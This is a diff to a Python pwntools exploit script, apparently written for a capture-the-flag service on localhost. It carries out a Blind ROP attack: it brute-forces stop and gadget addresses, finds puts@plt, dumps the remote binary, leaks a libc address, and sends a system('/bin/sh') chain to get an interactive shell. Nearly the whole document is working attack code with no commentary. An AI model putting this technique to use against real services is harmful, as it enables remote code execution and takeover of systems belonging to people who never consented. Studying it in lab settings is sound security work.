@@ -1,4 +1,5 @@
 from pwn import *
+from LibcSearcher import *
 
 context.log_level = 'debug'
 
@@ -22,13 +23,13 @@ def get_overflow_len():
             return cnt - 1
 
 
-def get_stop_addr(len):
-    addr = 0x400000
+def get_stop_addr(length):
+    addr = 0x4006b0
     while 1:
         try:
             sh = remote('127.0.0.1',9999)
             sh.recvuntil('WelCome my friend,Do you know password?\n')
-            payload = 'a' * len + p64(addr)
+            payload = 'a' * length + p64(addr) + p64(0) * 10
             sh.sendline(payload)
             output = sh.recv()
             sh.close()
@@ -38,6 +39,125 @@ def get_stop_addr(len):
             addr +=1
             sh.close()
 
+def check_brop(length,brop_gadget):
+    try:
+        sh = remote('127.0.0.1',9999)
+        payload = 'a' * length + p64(brop_gadget) + p64('a') * 10
+        sh.sendline(payload)
+        output = sh.recv()
+        log.info("check_brop at " + hex(brop_gadget) + output)
+        sh.close()
+        return False 
+    except Exception:
+        print "crush in check"
+        sh.close()
+        return True
+
+def get_brop_addr(length,stop_gadget):
+    addr = 0x4007b0
+    while 1:
+        try:
+            sh = remote('127.0.0.1',9999)
+            sh.recvuntil('WelCome my friend,Do you know password?\n')
+            payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10
+            sh.sendline(payload)
+            output = sh.recv()
+            sh.close()
+            if output != "":
+                print "****"
+                if(check_brop(length,addr)):
+                    log.success("get brop gadget at " + hex(addr))
+                    return addr
+                else:
+                    addr += 1
+            else:
+                addr += 1
+        except Exception:
+            print "crush***"
+            print hex(addr)
+            addr += 1
+            sh.close()
+
+def get_puts_plt(length,rdi_ret,stop_gadget):
+    puts_plt = 0x400550
+    while 1:
+        try:
+            sh = remote('127.0.0.1',9999)
+            sh.recvuntil('WelCome my friend,Do you know password?\n')
+            payload = 'a' * length + p64(rdi_ret) + p64(0x400000) + p64(puts_plt) + p64(stop_gadget) 
+            sh.sendline(payload)
+            output = sh.recv()
+            if output.startswith('\x7fELF'):
+                log.success("puts_plt at:"+hex(puts_plt))
+                return puts_plt
+            sh.close()
+            puts_plt += 1
+        except Exception:
+            print "crush"
+            sh.close()
+            puts_plt += 1
+
+def dump(length,rdi_ret,puts_plt,stop_gadget):
+    cnt = 0
+    data = ""
+    while cnt < 1024:
+        sh = remote('127.0.0.1',9999)
+        sh.recvuntil('WelCome my friend,Do you know password?\n')
+        payload = 'a' * length + p64(rdi_ret) + p64(0x400000+cnt) + p64(puts_plt) + p64(stop_gadget) 
+        sh.sendline(payload)
+        output = sh.recv()
+        print output
+        sh.close()
+        try:
+            output = output[:output.index("\n")]
+            if output == "":
+                output = '\x00'
+            cnt += len(output)
+            data += output
+        except Exception:
+            if output == "":
+                output = '\x00'
+            cnt += len(output)
+            data += output
+
+    with open('code','wb') as f:
+        f.write(data)
+
+def leak(length,rdi_ret,puts_plt,stop_gadget):
+    puts_got = 0x601018
+    sh = remote('127.0.0.1',9999)
+    sh.recvuntil('WelCome my friend,Do you know password?\n')
+    payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget) 
+    sh.sendline(payload)
+    output = sh.readline()
+    sh.close()
+    output = output.strip('\n').ljust(8,'\x00')
+    puts_addr = u64(output)
+    print hex(puts_addr)
+    return puts_addr   
+        
+
 if __name__ == '__main__':
-    length = get_overflow_len()
-    addr = get_stop_addr(length)
+    #length = get_overflow_len()
+    length = 72
+    #addr = get_stop_addr(length)
+    stop_gadget = 0x4006b6
+    #brop_gadget = get_brop_addr(length,stop_gadget)
+    brop_gadget = 0x4007ba
+    rdi_ret = brop_gadget + 0x9
+    #puts_plt = get_puts_plt(length,rdi_ret,stop_gadget)
+    puts_plt = 0x400560
+    #dump(length,rdi_ret,puts_plt,stop_gadget)
+    puts_addr = leak(length,rdi_ret,puts_plt,stop_gadget)
+    libc = LibcSearcher('puts',puts_addr)
+    libc_base = puts_addr - libc.dump('puts')
+    system = libc_base + libc.dump('system')
+    binsh = libc_base + libc.dump('str_bin_sh')
+    payload = p64(rdi_ret) + p64(binsh) + p64(system) + p64(stop_gadget)
+    sh = remote('127.0.0.1',9999)
+    sh.sendline(payload)
+    sh.interactive()
+    
+
+    
+    
